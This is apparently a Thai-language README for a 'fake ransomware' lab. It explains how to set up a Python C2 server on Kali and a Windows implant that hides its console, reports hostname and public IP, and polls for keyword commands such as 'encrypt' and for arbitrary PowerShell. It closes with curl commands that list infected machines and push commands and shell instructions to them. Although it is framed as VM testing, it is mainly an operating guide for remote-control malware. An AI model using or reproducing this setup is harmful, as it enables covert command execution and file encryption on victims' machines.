ที่ต้องใช้
-> VM windows 1 ตัว(ขั้นต่ำ) หรือไม่ใช้ VM ก็ได้ ในส่วนนี้เป็นแค่โค้ดการติดต่อกลับไปหาC2รอรับคำสั่งและรันคำสั่งแต่ไม่มีฟังก์ชัน encrypt อะไรใดๆ
-> VM kali 1 ตัว ใช้ setup เป็น C2 server

---- Set up (require network มีเน็ตไม่มีก็ได้แต่ต้องอยู่ใน LAN กัน) ----

-for C2 : 
  -> โหลดไฟล์ c2_server.py
  -> สร้างโฟลเดอร์หนึ่งขึ้นมาไว้ที่ไหนก็ได้ แล้วเอา c2_server.py ไปใส่ในโฟลเดอร์นั้น
  -> เปลี่ยน IP address ในไฟล์(บรรทัดสุดท้าย) ให้เป็นของเครื่องตัวเอง (เปลี่ยนพอร์ตหรือมไม่เปลี่ยนก็ได้) 
  -> เตรียมพร้อมเรียบร้อย

-for windows (ถ้าเป็น VM ตอนติดตั้ง python กด add path ด้วย)
  -> โหลดไฟล์ fake_ransom.py
  -> เปิด cmd พิมพ์ pip install requests
  -> เปลี่ยน C2_URL ในไฟล์(บรร7) ให้เป็น IP ของเครื่อง C2 (เลขพอร์ตกับ C2_server ต้องตรงกันด้วย) 
  -> เตรียมพร้อมเรียบร้อย

---- Start testing -----

C2 > เปิด terminal ที่ path ของโฟลเดอร์ที่เก็บไฟล์ c2_server.py (ที่สร้างขึ้นมาใหม่นั่นแหละ)
   > พิพม์ python3 c2_server.py 
   > จะเห็นว่า c2_server.py กำลังทำงานอยู่ ให้ปล่อยไว้อย่างงั้นมันคือการเปิด service http ไว้ใช้ติดต่อกับ client (C2 server ของเรา) ถ้าไม่ขึ้น error อะไรก็ทำตามขั้นตอนถัดไป

Windows > เปิดไฟล์ fake_ransom.py แล้วกดรัน

C2 > มาเช็คที่ cmd ที่รัน c2_server.py ถ้าเห็นข้อความประมาณ [+] Infected Device : DESKTOP-BKQ27N9 (223.207.113.65) แปลว่าเครื่อง Windows ที่รันไฟล์ fake_ransom.py ติดต่อกลับมาเรียบร้อยพร้อมรับคำสั่ง

---- อธิบายการทำงานของมัลแวร์ fake_ransom.py  ----


เมื่อกดรันโปรแกรมจะ 
  hide_console() -> ซ่อนหน้า terminal ไม่ให้เด้ง (มีผลต่อคอมไพล์ไฟล์เป็น .exe แต่ตอนนี้ยัง)
  report_to_c2() -> แจ้งเตือนไปยัง c2 server ที่ path /reports โดยจะแจ้ง hostname (ชื่อเครื่อง) + IP public (ไอพีสาธาณะตอนออกเน็ต) ของเครื่องไปให้ c2

  (loop)
# Command 
  get_command() -> เครื่องเหยื่อจะไปที่ path /command เพื่อดูว่า C2 สั่งอะไรให้เครื่องตัวเองมามั้ย ถ้ามีคำสั่งก็จะ execute_command(cmd)
  execute_command(cmd) -> get_command() รันคำสั่ง cmd ตามที่ได้มาจาก get_command() # ตอนเก็บใน C2 type เป็น jason ก็จริง แต่หลังจากผ่าน get_command() cmd ที่ได้มาก็เป็น strings ธรรมดา 
    -> ในที่นี้ cmd คือคียร์เวิร์ดที่เราต้องเขียนดักเองว่าถ้าเป็นคำสั่งนี้จะให้ทำอะไร ตัวอย่าง ถ้า cmd == "encrypt" ให้รันสคริปเข้ารหัสไฟล์ หรือ cmd == "modeng" -> ให้รันคำสั่งปิดเครื่อง

# powershell command
  get_shell() -> คล้าย get_command() เครื่องเหยื่อจะไปที่ path /shell เพื่อดูว่า C2 สั่งอะไรให้เครื่องตัวเองมามั้ย ถ้ามีคำสั่งก็จะ execute_shell(pws)
  execute_shell(pws) ->  รันคำสั่ง pws ตามที่ได้มาจาก get_command() # คำสั่ง powershell
    -> pws คือคำสั่ง powershell จริงๆ ที่ถ้าเครื่อง C2 สั่งมายังไงก็จะรันคำสั่งนั้นตรงๆ เช่น C2 ให้คำสั่งมาว่า start-process https://google.com แล้วเครื่องเหยื่อก็จำมีการรัน start-process https://google.com ที่เครื่องตัวเองจริงๆ
  
  time.sleep(10) # หลับไป 10 วินาทีแล้วมาเริ่มลูปใหม่อีกรอบ

---- วิธีให้ C2 สั่งคำสั่ง ----

ที่ C2 เปิด terminal ใหม่ขึ้นมาอันนึงไว้สำหรับส่งคำสั่ง
  
พิมพ์คำสั่ง
( รูปแบบ url -> http://192.168.10.151:8080 )

# ดูข้อมูลเครื่องที่เชื่อมต่อกับ C2 อยู่
curl -X GET http://<C2 IP>:8080/list_machines 

# สั่งเครื่องเหยื่อให้ทำ command ที่กำหนด (เช็ค หรือ เพิ่ม command ได้ในไฟล์ fakeransom.py)
curl -X POST -H "Content-Type: application/json" -d '{"hostname": "<ชื่อเครื่องเหยื่อ>", "cmd": "<command ที่ต้องการ>"}' http://192.168.10.151:8080/set_command

# สั่งเครื่องเหยื่อให้รัน powershell 
curl -X POST -H "Content-Type: application/json" -d '{"hostname": "<ชื่อเครื่องเหยื่อ>", "pws": "<powershell command ที่ต้องการ>"}' http://192.168.10.151:8080/set_shell


ตัวอย่าง -> curl -X POST -H "Content-Type: application/json" -d '{"hostname": "DESKTOP-BKQ27N9", "cmd": "encrypt"}' http://192.168.10.151:8080/set_command
ตัวอย่าง curl -X POST -H "Content-Type: application/json" -d '{"hostname": "DESKTOP-BKQ27N9", "pws": "start-process https://google.com"}' http://192.168.10.151:8080/set_shell




